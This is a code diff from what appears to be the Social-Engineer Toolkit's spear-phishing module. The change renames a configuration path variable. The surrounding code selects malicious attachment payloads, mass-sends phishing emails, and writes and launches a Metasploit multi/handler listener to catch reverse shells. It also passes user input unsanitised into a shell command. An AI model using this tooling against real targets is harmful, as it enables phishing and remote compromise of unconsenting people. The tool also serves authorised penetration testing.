@@ -109,41 +109,41 @@ print_info(
     "As an added bonus, use the file-format creator in SET to create your attachment.")
 counter = 0
 # PDF Previous
-if os.path.isfile(setdir + "/template.pdf"):
-    if os.path.isfile(setdir + "/template.rar"):
-        if os.path.isfile(setdir + "/template.zip"):
+if os.path.isfile(userconfigpath + "template.pdf"):
+    if os.path.isfile(userconfigpath + "template.rar"):
+        if os.path.isfile(userconfigpath + "template.zip"):
             print_warning("Multiple payloads were detected:")
             print ("1. PDF Payload\n2. VBS Payload\n3. Zipfile Payload\n\n")
             choose_payload = input(setprompt("0", ""))
             if choose_payload == '1':
-                file_format = (setdir + "/template.pdf")
+                file_format = (userconfigpath + "template.pdf")
             if choose_payload == '2':
-                file_format = (setdir + "/template.rar")
+                file_format = (userconfigpath + "template.rar")
             if choose_payload == '3':
-                file_format = (setdir + "/template.zip")
+                file_format = (userconfigpath + "template.zip")
             counter = 1
 
 if counter == 0:
-    if os.path.isfile(setdir + "/template.pdf"):
-        file_format = (setdir + "/template.pdf")
-    if os.path.isfile(setdir + "/template.rar"):
-        file_format = (setdir + "/template.rar")
-    if os.path.isfile(setdir + "/template.zip"):
-        file_format = (setdir + "/template.zip")
-    if os.path.isfile(setdir + "/template.doc"):
-        file_format = (setdir + "/template.doc")
-    if os.path.isfile(setdir + "/template.rtf"):
-        file_format = (setdir + "/template.rtf")
-    if os.path.isfile(setdir + "/template.mov"):
-        file_format = (setdir + "/template.mov")
+    if os.path.isfile(userconfigpath + "template.pdf"):
+        file_format = (userconfigpath + "template.pdf")
+    if os.path.isfile(userconfigpath + "template.rar"):
+        file_format = (userconfigpath + "template.rar")
+    if os.path.isfile(userconfigpath + "template.zip"):
+        file_format = (userconfigpath + "template.zip")
+    if os.path.isfile(userconfigpath + "template.doc"):
+        file_format = (userconfigpath + "template.doc")
+    if os.path.isfile(userconfigpath + "template.rtf"):
+        file_format = (userconfigpath + "template.rtf")
+    if os.path.isfile(userconfigpath + "template.mov"):
+        file_format = (userconfigpath + "template.mov")
 
 # Determine if prior payload created
-if not os.path.isfile(setdir + "/template.pdf"):
-    if not os.path.isfile(setdir + "/template.rar"):
-        if not os.path.isfile(setdir + "/template.zip"):
-            if not os.path.isfile(setdir + "/template.doc"):
-                if not os.path.isfile(setdir + "/template.rtf"):
-                    if not os.path.isfile(setdir + "/template.mov"):
+if not os.path.isfile(userconfigpath + "template.pdf"):
+    if not os.path.isfile(userconfigpath + "template.rar"):
+        if not os.path.isfile(userconfigpath + "template.zip"):
+            if not os.path.isfile(userconfigpath + "template.doc"):
+                if not os.path.isfile(userconfigpath + "template.rtf"):
+                    if not os.path.isfile(userconfigpath + "template.mov"):
                         print("No previous payload created.")
                         file_format = input(
                             setprompt(["1"], "Enter the file to use as an attachment"))
@@ -175,8 +175,8 @@ if filename1 == '1' or filename1 == '':
 if filename1 == '2':
     filename1 = input(setprompt(["1"], "New filename"))
     subprocess.Popen("cp %s %s/%s 1> /dev/null 2> /dev/null" %
-                     (file_format, setdir, filename1), shell=True).wait()
-    file_format = ("%s/%s" % (setdir, filename1))
+                     (file_format, userconfigpath, filename1), shell=True).wait()
+    file_format = ("%s/%s" % (userconfigpath, filename1))
     print_status("Filename changed, moving on...")
 
 print ("""
@@ -210,7 +210,7 @@ if option1 == '1' or option1 == '2':
     if template_choice == '1':
         # set path for
         path = 'src/templates/'
-        filewrite = open(setdir + "/email.templates", "w")
+        filewrite = open(userconfigpath + "email.templates", "w")
         counter = 0
         # Pull all files in the templates directory
         for infile in glob.glob(os.path.join(path, '*.template')):
@@ -223,7 +223,7 @@ if option1 == '1' or option1 == '2':
         # close the file
         filewrite.close()
         # read in formatted filenames
-        fileread = open(setdir + "/email.templates", "r").readlines()
+        fileread = open(userconfigpath + "email.templates", "r").readlines()
         print_info("Available templates:")
         for line in fileread:
             line = line.rstrip()
@@ -459,31 +459,31 @@ if option1 == '2':
         email_num = email_num + 1
         print("   Sent e-mail number: " + (str(email_num)))
 
-if not os.path.isfile(setdir + "/template.zip"):
+if not os.path.isfile(userconfigpath + "template.zip"):
     print_status("SET has finished delivering the emails")
     question1 = yesno_prompt(["1"], "Setup a listener [yes|no]")
     if question1 == 'YES':
-        if not os.path.isfile(setdir + "/payload.options"):
-            if not os.path.isfile(setdir + "/meta_config"):
-                if not os.path.isfile(setdir + "/unc_config"):
+        if not os.path.isfile(userconfigpath + "payload.options"):
+            if not os.path.isfile(userconfigpath + "meta_config"):
+                if not os.path.isfile(userconfigpath + "unc_config"):
                     print_error(
                         "Sorry, you did not generate your payload through SET, this option is not supported.")
-        if os.path.isfile(setdir + "/unc_config"):
+        if os.path.isfile(userconfigpath + "unc_config"):
             child = pexpect.spawn(
-                "%smsfconsole -r %s/unc_config" % (meta_path, setdir))
+                "%smsfconsole -r %s/unc_config" % (meta_path, userconfigpath))
             try:
                 child.interact()
             except Exception:
                 child.close()
 
-        if os.path.isfile(setdir + "/payload.options"):
-            fileopen = open(setdir + "/payload.options", "r").readlines()
+        if os.path.isfile(userconfigpath + "payload.options"):
+            fileopen = open(userconfigpath + "payload.options", "r").readlines()
             for line in fileopen:
                 line = line.rstrip()
                 line = line.split(" ")
 
             # CREATE THE LISTENER HERE
-            filewrite = open(setdir + "/meta_config", "w")
+            filewrite = open(userconfigpath + "meta_config", "w")
             filewrite.write("use exploit/multi/handler\n")
             filewrite.write("set PAYLOAD " + line[0] + "\n")
             filewrite.write("set LHOST " + line[1] + "\n")
@@ -493,7 +493,7 @@ if not os.path.isfile(setdir + "/template.zip"):
             filewrite.write("exploit -j\r\n\r\n")
             filewrite.close()
             child = pexpect.spawn(
-                "%smsfconsole -r %s/meta_config" % (meta_path, setdir))
+                "%smsfconsole -r %s/meta_config" % (meta_path, userconfigpath))
             try:
                 child.interact()
             except Exception:
